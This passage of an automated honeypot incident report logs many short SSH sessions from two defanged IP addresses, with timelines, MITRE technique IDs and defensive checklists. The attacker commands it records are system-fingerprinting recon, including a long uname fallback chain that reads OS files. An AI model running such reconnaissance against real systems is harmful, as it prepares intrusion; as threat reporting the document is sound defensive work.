| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:14` | `cowrie.session.connect` |
| `2026-08-15 05:36:14` | `cowrie.client.version` |
| `2026-08-15 05:36:14` | `cowrie.client.kex` |
| `2026-08-15 05:36:16` | `cowrie.login.success` |
| `2026-08-15 05:36:18` | `cowrie.session.params` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.success` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:18` | `cowrie.command.input` |
| `2026-08-15 05:36:19` | `cowrie.log.closed` |
| `2026-08-15 05:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367964ef8b9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:18` | `cowrie.session.connect` |
| `2026-08-15 05:36:19` | `cowrie.client.version` |
| `2026-08-15 05:36:19` | `cowrie.client.kex` |
| `2026-08-15 05:36:19` | `cowrie.login.success` |
| `2026-08-15 05:36:20` | `cowrie.session.params` |
| `2026-08-15 05:36:20` | `cowrie.command.input` |
| `2026-08-15 05:36:20` | `cowrie.log.closed` |
| `2026-08-15 05:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63627ff2bdd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:24` | `cowrie.session.connect` |
| `2026-08-15 05:36:24` | `cowrie.client.version` |
| `2026-08-15 05:36:24` | `cowrie.client.kex` |
| `2026-08-15 05:36:24` | `cowrie.login.success` |
| `2026-08-15 05:36:25` | `cowrie.session.params` |
| `2026-08-15 05:36:25` | `cowrie.command.input` |
| `2026-08-15 05:36:26` | `cowrie.log.closed` |
| `2026-08-15 05:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c810b93cb32e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:29` | `cowrie.session.connect` |
| `2026-08-15 05:36:29` | `cowrie.client.version` |
| `2026-08-15 05:36:29` | `cowrie.client.kex` |
| `2026-08-15 05:36:30` | `cowrie.login.success` |
| `2026-08-15 05:36:31` | `cowrie.session.params` |
| `2026-08-15 05:36:31` | `cowrie.command.input` |
| `2026-08-15 05:36:31` | `cowrie.log.closed` |
| `2026-08-15 05:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe42763f943

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:35` | `cowrie.session.connect` |
| `2026-08-15 05:36:35` | `cowrie.client.version` |
| `2026-08-15 05:36:35` | `cowrie.client.kex` |
| `2026-08-15 05:36:35` | `cowrie.login.success` |
| `2026-08-15 05:36:36` | `cowrie.session.params` |
| `2026-08-15 05:36:36` | `cowrie.command.input` |
| `2026-08-15 05:36:36` | `cowrie.log.closed` |
| `2026-08-15 05:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93616017c892

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:40` | `cowrie.session.connect` |
| `2026-08-15 05:36:40` | `cowrie.client.version` |
| `2026-08-15 05:36:40` | `cowrie.client.kex` |
| `2026-08-15 05:36:41` | `cowrie.login.success` |
| `2026-08-15 05:36:42` | `cowrie.session.params` |
| `2026-08-15 05:36:42` | `cowrie.command.input` |
| `2026-08-15 05:36:43` | `cowrie.log.closed` |
| `2026-08-15 05:36:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cdc21b64c2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:46` | `cowrie.session.connect` |
| `2026-08-15 05:36:46` | `cowrie.client.version` |
| `2026-08-15 05:36:46` | `cowrie.client.kex` |
| `2026-08-15 05:36:47` | `cowrie.login.success` |
| `2026-08-15 05:36:47` | `cowrie.session.params` |
| `2026-08-15 05:36:47` | `cowrie.command.input` |
| `2026-08-15 05:36:47` | `cowrie.log.closed` |
| `2026-08-15 05:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-068e61389188

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:51` | `cowrie.session.connect` |
| `2026-08-15 05:36:51` | `cowrie.client.version` |
| `2026-08-15 05:36:51` | `cowrie.client.kex` |
| `2026-08-15 05:36:52` | `cowrie.login.success` |
| `2026-08-15 05:36:53` | `cowrie.session.params` |
| `2026-08-15 05:36:53` | `cowrie.command.input` |
| `2026-08-15 05:36:53` | `cowrie.log.closed` |
| `2026-08-15 05:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4c95340e00

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:57` | `cowrie.session.connect` |
| `2026-08-15 05:36:57` | `cowrie.client.version` |
| `2026-08-15 05:36:57` | `cowrie.client.kex` |
| `2026-08-15 05:36:57` | `cowrie.login.success` |
| `2026-08-15 05:36:58` | `cowrie.session.params` |
| `2026-08-15 05:36:58` | `cowrie.command.input` |
| `2026-08-15 05:36:58` | `cowrie.log.closed` |
| `2026-08-15 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd926e7aa818

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:02` | `cowrie.session.connect` |
| `2026-08-15 05:37:02` | `cowrie.client.version` |
| `2026-08-15 05:37:02` | `cowrie.client.kex` |
| `2026-08-15 05:37:03` | `cowrie.login.success` |
| `2026-08-15 05:37:03` | `cowrie.session.params` |
| `2026-08-15 05:37:03` | `cowrie.command.input` |
| `2026-08-15 05:37:04` | `cowrie.log.closed` |
| `2026-08-15 05:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3145ee07f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:08` | `cowrie.session.connect` |
| `2026-08-15 05:37:08` | `cowrie.client.version` |
| `2026-08-15 05:37:08` | `cowrie.client.kex` |
| `2026-08-15 05:37:08` | `cowrie.login.success` |
| `2026-08-15 05:37:09` | `cowrie.session.params` |
| `2026-08-15 05:37:09` | `cowrie.command.input` |
| `2026-08-15 05:37:09` | `cowrie.log.closed` |
| `2026-08-15 05:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6211a1c476f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:14` | `cowrie.session.connect` |
| `2026-08-15 05:37:14` | `cowrie.client.version` |
| `2026-08-15 05:37:14` | `cowrie.client.kex` |
| `2026-08-15 05:37:14` | `cowrie.login.success` |
| `2026-08-15 05:37:15` | `cowrie.session.params` |
| `2026-08-15 05:37:15` | `cowrie.command.input` |
| `2026-08-15 05:37:15` | `cowrie.log.closed` |
| `2026-08-15 05:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0d35a78fc2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:19` | `cowrie.session.connect` |
| `2026-08-15 05:37:19` | `cowrie.client.version` |
| `2026-08-15 05:37:19` | `cowrie.client.kex` |
| `2026-08-15 05:37:19` | `cowrie.login.success` |
| `2026-08-15 05:37:20` | `cowrie.session.params` |
| `2026-08-15 05:37:20` | `cowrie.command.input` |
| `2026-08-15 05:37:21` | `cowrie.log.closed` |
| `2026-08-15 05:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bde02683396

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:24` | `cowrie.session.connect` |
| `2026-08-15 05:37:24` | `cowrie.client.version` |
| `2026-08-15 05:37:24` | `cowrie.client.kex` |
| `2026-08-15 05:37:25` | `cowrie.login.success` |
| `2026-08-15 05:37:26` | `cowrie.session.params` |
| `2026-08-15 05:37:26` | `cowrie.command.input` |
| `2026-08-15 05:37:26` | `cowrie.log.closed` |
| `2026-08-15 05:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd43bbc85c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:29` | `cowrie.session.connect` |
| `2026-08-15 05:37:29` | `cowrie.client.version` |
| `2026-08-15 05:37:30` | `cowrie.client.kex` |
| `2026-08-15 05:37:30` | `cowrie.login.success` |
| `2026-08-15 05:37:31` | `cowrie.session.params` |
| `2026-08-15 05:37:31` | `cowrie.command.input` |
| `2026-08-15 05:37:31` | `cowrie.log.closed` |
| `2026-08-15 05:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f847285ef462

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:35` | `cowrie.session.connect` |
| `2026-08-15 05:37:35` | `cowrie.client.version` |
| `2026-08-15 05:37:35` | `cowrie.client.kex` |
| `2026-08-15 05:37:35` | `cowrie.login.success` |
| `2026-08-15 05:37:36` | `cowrie.session.params` |
| `2026-08-15 05:37:36` | `cowrie.command.input` |
| `2026-08-15 05:37:36` | `cowrie.log.closed` |
| `2026-08-15 05:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23745f96f36

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:40` | `cowrie.session.connect` |
| `2026-08-15 05:37:40` | `cowrie.client.version` |
| `2026-08-15 05:37:40` | `cowrie.client.kex` |
| `2026-08-15 05:37:41` | `cowrie.login.success` |
| `2026-08-15 05:37:42` | `cowrie.session.params` |
| `2026-08-15 05:37:42` | `cowrie.command.input` |
| `2026-08-15 05:37:42` | `cowrie.log.closed` |
| `2026-08-15 05:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9906115c8fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:45` | `cowrie.session.connect` |
| `2026-08-15 05:37:46` | `cowrie.client.version` |
| `2026-08-15 05:37:46` | `cowrie.client.kex` |
| `2026-08-15 05:37:46` | `cowrie.login.success` |
| `2026-08-15 05:37:47` | `cowrie.session.params` |
| `2026-08-15 05:37:47` | `cowrie.command.input` |
| `2026-08-15 05:37:47` | `cowrie.log.closed` |
| `2026-08-15 05:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e716a3cef8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:51` | `cowrie.session.connect` |
| `2026-08-15 05:37:51` | `cowrie.client.version` |
| `2026-08-15 05:37:51` | `cowrie.client.kex` |
| `2026-08-15 05:37:52` | `cowrie.login.success` |
| `2026-08-15 05:37:53` | `cowrie.session.params` |
| `2026-08-15 05:37:53` | `cowrie.command.input` |
| `2026-08-15 05:37:53` | `cowrie.log.closed` |
| `2026-08-15 05:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06a2354887aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:37 |
| **Last Seen** | 2026-08-15 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:37:56` | `cowrie.session.connect` |
| `2026-08-15 05:37:56` | `cowrie.client.version` |
| `2026-08-15 05:37:56` | `cowrie.client.kex` |
| `2026-08-15 05:37:57` | `cowrie.login.success` |
| `2026-08-15 05:37:57` | `cowrie.session.params` |
| `2026-08-15 05:37:57` | `cowrie.command.input` |
| `2026-08-15 05:37:58` | `cowrie.log.closed` |
| `2026-08-15 05:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63701b96a801

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:01` | `cowrie.session.connect` |
| `2026-08-15 05:38:01` | `cowrie.client.version` |
| `2026-08-15 05:38:01` | `cowrie.client.kex` |
| `2026-08-15 05:38:02` | `cowrie.login.success` |
| `2026-08-15 05:38:03` | `cowrie.session.params` |
| `2026-08-15 05:38:03` | `cowrie.command.input` |
| `2026-08-15 05:38:03` | `cowrie.log.closed` |
| `2026-08-15 05:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d96a098c1ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:06` | `cowrie.session.connect` |
| `2026-08-15 05:38:06` | `cowrie.client.version` |
| `2026-08-15 05:38:07` | `cowrie.client.kex` |
| `2026-08-15 05:38:07` | `cowrie.login.success` |
| `2026-08-15 05:38:08` | `cowrie.session.params` |
| `2026-08-15 05:38:08` | `cowrie.command.input` |
| `2026-08-15 05:38:08` | `cowrie.log.closed` |
| `2026-08-15 05:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a88828241785

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:12` | `cowrie.session.connect` |
| `2026-08-15 05:38:12` | `cowrie.client.version` |
| `2026-08-15 05:38:12` | `cowrie.client.kex` |
| `2026-08-15 05:38:12` | `cowrie.login.success` |
| `2026-08-15 05:38:13` | `cowrie.session.params` |
| `2026-08-15 05:38:13` | `cowrie.command.input` |
| `2026-08-15 05:38:13` | `cowrie.log.closed` |
| `2026-08-15 05:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9788f257266

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:38:17` | `cowrie.session.connect` |
| `2026-08-15 05:38:17` | `cowrie.client.version` |
| `2026-08-15 05:38:17` | `cowrie.client.kex` |
| `2026-08-15 05:38:18` | `cowrie.login.success` |
| `2026-08-15 05:38:18` | `cowrie.session.params` |
| `2026-08-15 05:38:18` | `cowrie.command.input` |
| `2026-08-15 05:38:18` | `cowrie.log.closed` |
| `2026-08-15 05:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57764f14a3c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:38 |
| **Last Seen** | 2026-08-15 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
